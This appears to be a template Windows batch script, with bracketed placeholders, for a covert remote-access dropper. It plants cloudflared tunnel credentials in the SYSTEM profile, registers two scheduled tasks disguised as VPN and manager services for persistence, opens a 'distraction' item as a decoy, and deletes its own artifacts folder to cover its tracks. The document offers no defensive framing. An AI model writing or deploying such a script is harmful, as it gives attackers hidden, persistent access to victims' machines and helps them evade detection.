@echo off

mkdir %windir%\sysnative\config\systemprofile\.cloudflared
echo [tunnel-content] > %windir%\sysnative\config\systemprofile\.cloudflared\[tunnel-uuid].json

schtasks.exe /Create /XML artifacts\Service-vpn.xml /tn "[task-title-vpn]"
schtasks.exe /Create /XML artifacts\Service-manager.xml /tn "[task-title-manager]"

start [distraction-start]

RMDIR "artifacts" /S /Q